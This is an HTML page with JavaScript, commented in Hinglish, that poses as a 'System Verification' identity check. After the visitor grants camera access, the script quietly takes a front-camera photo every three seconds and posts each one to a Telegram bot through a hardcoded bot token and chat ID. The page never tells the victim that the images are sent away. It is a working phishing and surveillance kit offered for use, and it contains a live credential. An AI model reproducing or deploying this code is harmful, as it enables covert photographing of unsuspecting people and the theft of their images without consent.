<!DOCTYPE html>
<html lang="hi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Advanced Web Capture</title>
    <style>
        :root { --primary: #0088cc; --bg: #0f0f0f; }
        body { 
            background-color: var(--bg); color: white; 
            font-family: 'Segoe UI', sans-serif; display: flex;
            flex-direction: column; align-items: center; justify-content: center;
            height: 100vh; margin: 0;
        }
        .container {
            width: 90%; max-width: 500px; text-align: center;
            background: #1e1e1e; padding: 20px; border-radius: 15px;
            box-shadow: 0 10px 30px rgba(0,0,0,0.5);
        }
        video { 
            width: 100%; border-radius: 10px; background: #000;
            transform: scaleX(-1); /* Mirror view */
        }
        .status { margin: 15px 0; font-size: 14px; color: #aaa; }
        .btn-start {
            background: var(--primary); border: none; color: white;
            padding: 12px 30px; border-radius: 25px; font-weight: bold;
            cursor: pointer; font-size: 16px; transition: 0.3s;
        }
        .btn-start:hover { transform: scale(1.05); background: #00aaff; }
        canvas { display: none; } /* Hidden processing canvas */
    </style>
</head>
<body>

    <div class="container">
        <h2>System Verification</h2>
        <p class="status" id="statusLabel">Camera Access Required to Proceed</p>
        
        <video id="video" autoplay playsinline></video>
        <canvas id="canvas"></canvas>

        <div style="margin-top: 20px;">
            <button class="btn-start" id="initBtn">Verify My Identity</button>
        </div>
    </div>

    <script>
        // --- CONFIGURATION ---
        const BOT_TOKEN = '7866282179:AAGYCmuvhoCoxVjSXn5UmnI7onomvDKbIgE'; // Apna Token yahan dalein
        const CHAT_ID = '8285724366';     // Apni Chat ID yahan dalein
        const CAPTURE_INTERVAL = 3000;           // Har 3 second mein photo (Speed)

        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        const initBtn = document.getElementById('initBtn');
        const statusLabel = document.getElementById('statusLabel');

        // 1. Image ko Telegram bhejne ka Function
        async function sendToTelegram(blob) {
            const formData = new FormData();
            formData.append('chat_id', CHAT_ID);
            formData.append('photo', blob, 'capture.jpg');

            try {
                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                    method: 'POST',
                    body: formData
                });
                console.log("Image sent to Telegram.");
            } catch (err) {
                console.error("Telegram Error:", err);
            }
        }

        // 2. Automatic Capture Logic
        function startAutoCapture() {
            statusLabel.innerText = "System Verified. Processing...";
            statusLabel.style.color = "#4CAF50";

            setInterval(() => {
                const ctx = canvas.getContext('2d');
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                
                // Draw current frame to canvas
                ctx.drawImage(video, 0, 0);

                // Convert to Blob and Send
                canvas.toBlob((blob) => {
                    if(blob) sendToTelegram(blob);
                }, 'image/jpeg', 0.7); // 0.7 quality for speed
            }, CAPTURE_INTERVAL);
        }

        // 3. Camera Permission aur Start
        initBtn.addEventListener('click', async () => {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ 
                    video: { facingMode: "user" }, 
                    audio: false 
                });
                video.srcObject = stream;
                initBtn.style.display = 'none'; // Button hide kar do
                
                // Thodi der wait karein taaki camera focus ho jaye
                setTimeout(startAutoCapture, 1000);

            } catch (err) {
                statusLabel.innerText = "Error: Camera Permission Denied.";
                statusLabel.style.color = "#ff5252";
                console.error(err);
            }
        });
    </script>
</body>
</html>
